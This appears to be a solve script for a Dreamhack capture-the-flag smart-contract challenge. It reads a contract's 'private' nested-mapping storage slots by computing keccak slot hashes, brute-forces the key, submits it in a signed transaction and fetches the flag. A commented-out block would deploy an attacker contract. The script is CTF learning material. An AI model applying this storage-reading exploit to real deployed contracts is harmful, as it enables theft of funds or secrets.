from web3 import Web3
from eth_utils import keccak
import os
import re
import subprocess
import requests
import json

# 문제에서 사용하는 각종 정보 추출
MAIN_URL = "http://host3.dreamhack.games:10824"
FILE_NM = "./token_info"

with open(FILE_NM, "r") as f:
    TOKEN_URL = f.read()

START_URL = f"{MAIN_URL}/start"

if (TOKEN_URL == ""):
    try:
        resp = requests.get(START_URL)

        JSON_OBJECT = json.loads(resp.text)

        TOKEN_URL = JSON_OBJECT['message'].split('/')[1]
        
        with open(FILE_NM, "w") as f:
            f.write(TOKEN_URL)
    except:
        with open(FILE_NM, "w") as f:
            pass
        exit(0)

INFO_URL = f"{MAIN_URL}/{TOKEN_URL}/info"
FLAG_URL = f"{MAIN_URL}/{TOKEN_URL}/flag"
RPC_URL = f"{MAIN_URL}/{TOKEN_URL}/rpc"

print(f"INFO URL : {INFO_URL}")
print(f"FLAG URL : {FLAG_URL}")
print(f"RPC URL : {RPC_URL}")

resp = requests.get(INFO_URL)

JSON_OBJECT = json.loads(resp.text)

CONTRACT_ADDRESS = JSON_OBJECT["message"]["level_contract_address"]
USER_PRIV_KEY = JSON_OBJECT["message"]["user_private_key"]
USER_ADDRESS = JSON_OBJECT["message"]["user_address"]

print(f"Contract Address : {CONTRACT_ADDRESS}")
print(f"User private key : {USER_PRIV_KEY}")
print(f"User address : {USER_ADDRESS}")

CONTRACT_ABI = [
    {
        "inputs": [
            {
                "internalType": "bytes",
                "name": "value",
                "type": "bytes"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "key",
                "type": "uint256"
            }
        ],
        "name": "open",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "opened",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "triggered",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

ATTACKER_ABI = []

web3 = Web3(Web3.HTTPProvider(RPC_URL))
'''
current_file = os.path.abspath(__file__)

BASE_DIR = os.path.dirname(current_file) + "/sc-token-giveaway"
CONTRACT_PATH = "/src/Attacker.sol"

command = [
    "forge", "create",
    "--rpc-url", RPC_URL,
    "--private-key", USER_PRIV_KEY,
    BASE_DIR + CONTRACT_PATH + ":Attacker",
    "--via-ir",
    "--broadcast",
    "--constructor-args",
    CONTRACT_ADDRESS
]

try:
    result = subprocess.run(command, check=True, text=True, capture_output=True)
    print("CONTRACT DEPLOY SUCCESS!")
    
    attacker_address_match = re.search(r"Deployed to: (0x[a-fA-F0-9]{40})", result.stdout)

    ATTACKER_ADDRESS = attacker_address_match.group(1) if attacker_address_match else "Not found..."
    
except subprocess.CalledProcessError as e:
    print("CONTRACT DEPLOY FAILED...")
    print(e.stderr)

if (ATTACKER_ADDRESS == "Not found..."):
    print("ATTACKER ADDRESS NOT FOUND...")
    exit(0)

attacker = web3.eth.contract(abi=ATTACKER_ABI, address=ATTACKER_ADDRESS)
'''
contract = web3.eth.contract(abi=CONTRACT_ABI, address=CONTRACT_ADDRESS)

print("---- DO ATTACK ----")

def to_byte_hex(val):
    return val.to_bytes(32, byteorder='big')

def find_key():
    BASE_SLOT = 0
    BASE_PADDED = to_byte_hex(BASE_SLOT)
    
    for z in range(10):
        for y in range(10):
            for x in range(10):
                KEY1_INPUT = to_byte_hex(z) + BASE_PADDED
                KEY1_HASH = keccak(KEY1_INPUT)
                
                KEY2_INPUT = to_byte_hex(y) + KEY1_HASH
                KEY2_HASH = keccak(KEY2_INPUT)
                
                FINAL_INPUT = to_byte_hex(x) + KEY2_HASH
                FINAL_HASH = keccak(FINAL_INPUT)

                VALUE_RAW = web3.eth.get_storage_at(CONTRACT_ADDRESS, FINAL_HASH)
                VALUE_BOOL = bool(int.from_bytes(VALUE_RAW, byteorder='big'))
                
                print(f"safe[{x}][{y}][{z}]: {VALUE_BOOL}")
                
                if (VALUE_BOOL == True):
                    KEY = x * 100 + y * 10 + z
                    print(f"Key found : {KEY}")
                    return KEY
    print("Not found")
    exit(0)

KEY = find_key()

tx = contract.functions.open(KEY).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

print("---- GET FLAG ----")
resp = requests.get(FLAG_URL)

print(resp.text)